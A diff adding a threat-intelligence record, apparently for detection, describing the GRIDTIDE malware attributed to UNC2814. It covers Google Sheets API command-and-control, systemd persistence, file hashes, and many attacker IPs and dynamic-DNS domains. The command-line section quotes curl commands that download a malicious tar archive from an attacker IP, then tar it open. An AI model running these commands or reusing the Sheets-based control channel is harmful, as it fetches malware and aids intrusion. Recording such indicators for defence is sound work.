@@ -1,0 +1,277 @@
+description: GRIDTIDE malware uses Google Sheets API for command and control, downloads
+  malicious components from a compromised server, and employs persistence mechanisms
+  via systemd services.
+attribution: UNC2814
+malware_families:
+- GRIDTIDE
+TTPs:
+  processes:
+  - systemd
+  - curl
+  - tar
+  - gzip
+  commandline:
+  - curl -ik https://sheets.googleapis.com:443/v4/spreadsheets/<GoogleSheetID>/values/A1?valueRenderOption=FORMULA
+  - curl -ik https://sheets.googleapis.com:443/v4/spreadsheets/<GoogleSheetID>/values:batchClear
+  - curl -ik https://sheets.googleapis.com:443/v4/spreadsheets/<GoogleSheetID>/values:batchUpdate
+  - curl -ik http://130.94.6.228/apt.tar.gz
+  - tar -xzf apt.tar.gz
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - systemd->curl->https://sheets.googleapis.com:443/v4/spreadsheets/<GoogleSheetID>/values/A1?valueRenderOption=FORMULA
+  - systemd->curl->http://130.94.6.228/apt.tar.gz
+  file_activity:
+  - /etc/systemd/system/xapt.service
+  - /tmp/apt.tar.gz
+  - /tmp/update.tar.gz
+  - /tmp/amp.tar.gz
+  - /tmp/fire
+  - /tmp/hamcore.se2
+  - /tmp/vpn_bridge.config
+  - /tmp/pmp.cfg
+  persistence:
+  - systemd service file creation for GRIDTIDE
+  process_relations:
+  - systemd->curl
+IOCs:
+  hashes:
+  - ce36a5fc44cbd7de947130b67be9e732a7b4086fb1df98a5afd724087c973b47
+  - 01fc3bd5a78cd59255a867ffb3dfdd6e0b7713ee90098ea96cc01c640c6495eb
+  - eb08c840f4c95e2fa5eff05e5f922f86c766f5368a63476f046b2b9dbffc2033
+  - 4eb994b816a1a24cf97bfd7551d00fe14b810859170dbf15180d39e05cd7c0f9
+  - 669917bad46a57e5f2de037f8ec200a44fb579d723af3e2f1be1e8479a267966
+  ip_addresses:
+  - 130.94.6.228
+  - 38.180.205.14
+  - 38.60.194.21
+  - 38.54.112.184
+  - 38.60.171.242
+  - 195.123.211.70
+  - 202.59.10.122
+  - 38.60.252.66
+  - 45.76.184.214
+  - 45.90.59.129
+  - 195.123.226.235
+  - 65.20.104.91
+  - 5.34.176.6
+  - 139.84.236.237
+  - 149.28.128.128
+  - 38.54.31.146
+  - 178.79.188.181
+  - 38.54.37.196
+  - 207.148.73.18
+  - 38.60.224.25
+  - 149.28.139.125
+  - 38.54.32.244
+  - 38.54.82.69
+  - 45.76.157.113
+  - 45.77.254.168
+  - 139.180.219.115
+  domains:
+  - 1cv2f3d5s6a9w.ddnsfree.com
+  - admina.freeddns.org
+  - afsaces.accesscam.org
+  - ancisesic.accesscam.org
+  - applebox.camdvr.org
+  - appler.kozow.com
+  - asdad21ww.freeddns.org
+  - aw2o25forsbc.camdvr.org
+  - awcc001jdaigfwdagdcew.giize.com
+  - bab2o25com.accesscam.org
+  - babaji.accesscam.org
+  - babi5599ss.ddnsgeek.org
+  - balabalabo.mywire.org
+  - bggs.giize.com
+  - bibabo.freeddns.org
+  - binmol.webredirect.org
+  - bioth.giize.com
+  - Boemobww.ddnsfree.org
+  - brcallletme.theworkpc.com
+  - btbtutil.theworkpc.com
+  - btltan.ooguy.com
+  - camcampkes.ddnsfree.org
+  - camsqewivo.kozow.com
+  - ccammutom.ddnsgeek.org
+  - cdnvmtools.theworkpc.com
+  - cloacpae.ddnsfree.org
+  - cmwwoods1.theworkpc.com
+  - cnrpaslceas.freeddns.org
+  - codemicros12.gleeze.com
+  - cressmiss.ooguy.com
+  - cvabiasbae.ddnsfree.com
+  - cvnoc01da1cjmnftsd.accesscam.org
+  - cvpc01aenusocirem.accesscam.org
+  - cvpc01cgsdfn53hgd.giize.com
+  - DCLCWPDTSDCC.ddnsfree.org
+  - dlpossie.ddnsfree.org
+  - dnsfreedb.ddnsfree.org
+  - doboudix1024.mywire.org
+  - evilginx2.loseyourip.com
+  - examp1e.theworkpc.com
+  - faeelt.giize.com
+  - fakjcsaeyhs.ddnsfree.org
+  - fasceadvcva3.gleeze.com
+  - ffosies2024.camdvr.org
+  - fgdedd1dww.gleeze.com
+  - filipinet.ddnsgeek.org
+  - freeios.theworkpc.com
+  - ftpuser14.gleeze.com
+  - ftpzpak.kozow.com
+  - globoss.kozow.com
+  - gogo2025up.ddnsfree.org
+  - googlel.gleeze.com
+  - googles.accesscam.org
+  - googles.ddnsfree.org
+  - googlett.camdvr.org
+  - googllabwws.gleeze.com
+  - gtaldps31c.ddnsfree.org
+  - hamkorg.kozow.com
+  - honidoo.loseyourip.com
+  - huygdr12.loseyourip.com
+  - icekancusjhea.ddnsgeek.org
+  - idstandsuui.kozow.com
+  - indoodchat.theworkpc.com
+  - jarvis001.freeddns.org
+  - Kaushalya.freeddns.org
+  - khyes001ndfpnuewdm.kozow.com
+  - kskxoscieontrolanel.gleeze.com
+  - ksv01sokudwongsj.theworkpc.com
+  - lcskiecjj.loseyourip.com
+  - lcskiecs.ddnsfree.com
+  - losiesca.ddnsgeek.org
+  - lps2staging.ddnsfree.com
+  - lsls.casacam.net
+  - ltiuys.ddnsgeek.org
+  - ltiuys.kozow.com
+  - mailsdy.gleeze.com
+  - maliclick1.ddnsfree.com
+  - mauritasszddb.ddnsfree.com
+  - meetls.kozow.com
+  - Microsoft.bumbleshrimp.com
+  - ml3.freeddns.org
+  - mlksucnayesk.kozow.com
+  - mmmfaco2025.mywire.org
+  - mms.bumbleshrimp.com
+  - mmvmtools.giize.com
+  - modgood.gleeze.com
+  - Mosplosaq.accesscam.org
+  - mysql.casacam.net
+  - nenigncagvawr.giize.com
+  - nenignenigoncqvoo.ooguy.com
+  - nenigoncqnutgo.accesscam.org
+  - nenigoncuopzc.giize.com
+  - nims.gleeze.com
+  - nisaldwoa.theworkpc.com
+  - nmszablogs.ddnsfree.com
+  - nodekeny11.freeddns.org
+  - nodjs2o25nodjs.giize.com
+  - Npeoples.theworkpc.com
+  - officeshan.kozow.com
+  - okkstt.ddnsgeek.org
+  - oldatain1.ddnsgeek.org
+  - onlyosun.ooguy.com
+  - osix.ddnsgeek.org
+  - ovmmiuy.mywire.org
+  - palamolscueajfvc.gleeze.com
+  - pawanp.kozow.com
+  - pcmainecia.ddnsfree.com
+  - pcvmts3.kozow.com
+  - peisuesacae.loseyourip.com
+  - peowork.ddnsgeek.org
+  - pepesetup.ddnsfree.com
+  - pewsus.freeddns.org
+  - plcoaweniva.ddnsgeek.org
+  - PolicyAgent.theworkpc.com
+  - polokinyea.gleeze.com
+  - pplodsssead222.loseyourip.com
+  - pplosad231.kozow.com
+  - ppsaBedon.gleeze.com
+  - prdanjana01.ddnsfree.com
+  - prepaid127.freeddns.org
+  - PRIFTP.kozow.com
+  - prihxlcs.ddnsfree.com
+  - prihxlcsw.theworkpc.com
+  - pxlaxvvva.freeddns.org
+  - quitgod2023luck.giize.com
+  - rabbit.ooguy.com
+  - rsm323.kozow.com
+  - saf3asg.giize.com
+  - Scopps.ddnsgeek.com
+  - sdhite43.ddnsfree.com
+  - sdsuytoins63.kozow.com
+  - selfad.gleeze.com
+  - serious.kozow.com
+  - setupcodpr2.freeddns.org
+  - sgsn.accesscam.org
+  - Smartfren.giize.com
+  - sn0son4t31bbsvopou.camdvr.org
+  - sn0son4t31opc.freeddns.org
+  - soovuy.gleeze.com
+  - styuij.mywire.org
+  - supceasfg1.loseyourip.com
+  - systemsz.kozow.com
+  - t31c0mjumpcuyerop.ooguy.com
+  - t31c0mopamcuiomx.kozow.com
+  - t31c0mopmiuewklg.webredirect.org
+  - t31c0mopocuveop.accesscam.org
+  - t3lc0mcanyqbfac.loseyourip.com
+  - t3lc0mczmoihwc.camdvr.org
+  - t3lc0mh4udncifw.casacam.net
+  - t3lc0mhasvnctsk.giize.com
+  - t3lm0rtlcagratu.kozow.com
+  - tch.giize.com
+  - telcomn.giize.com
+  - telen.bumbleshrimp.com
+  - telkom.ooguy.com
+  - telkomservices.theworkpc.com
+  - thbio.kozow.com
+  - timpe.kozow.com
+  - timpe.webredirect.org
+  - tlse001hdfuwwgdgpnn.theworkpc.com
+  - tltlsktelko.ddnsfree.com
+  - transport.dynuddns.net
+  - trvcl.bumbleshrimp.com
+  - ttsiou12.loseyourip.com
+  - ua2o25yth.ddnsgeek.org
+  - udieyg.gleeze.com
+  - unnjunnani.ddnsfree.com
+  - updatamail.kozow.com
+  - updatasuccess.ddnsgeek.com
+  - updateservices.kozow.com
+  - updatetools.giize.com
+  - uscplxsecjs.ddnsgeek.com
+  - USOShared1.ddnsfree.com
+  - vals.bumbleshrimp.com
+  - vass.ooguy.com
+  - vass2025.casacam.net
+  - vmtools.camdvr.org
+  - vmtools.loseyourip.com
+  - vosies.ddnsfree.com
+  - vpaspmine.freeddns.org
+  - wdlcamaakc.ooguy.com
+  - winfoss1.kozow.com
+  - ysiohbk.camdvr.org
+  - zammffayhd.ddnsfree.com
+  - zmcmvmbm.ddnsfree.com
+  - zwmn350n3o1fsdf3gs.kozow.com
+  - zwmn350n3o1ugety2xbe.camdvr.org
+  - zwmn350n3o1vsdrggs.ddnsfree.com
+  - zwt310n3o1unety2kab.webredirect.org
+  - zwt310n3o2unety6a3k.kozow.com
+  - zwt31n3t0nidoqmve.camdvr.org
+  - zwt3ln3t1aimckalw.theworkpc.com
+  urls:
+  - http://130.94.6.228/apt.tar.gz
+  - http://130.94.6.228/update.tar.gz
+  - http://130.94.6.228/amp.tar.gz
+  - https://sheets.googleapis.com:443/v4/spreadsheets/<GoogleSheetID>/values/A1?valueRenderOption=FORMULA
+  - https://sheets.googleapis.com:443/v4/spreadsheets/<GoogleSheetID>/values:batchClear
+  - https://sheets.googleapis.com:443/v4/spreadsheets/<GoogleSheetID>/values:batchUpdate
+authors:
+- Google Threat Intelligence Group
+reference: https://cloud.google.com/blog/topics/threat-intelligence/disrupting-gridtide-global-espionage-campaign/
+date_of_publication: February 28, 2026
+file_creation_date: February 28, 2026
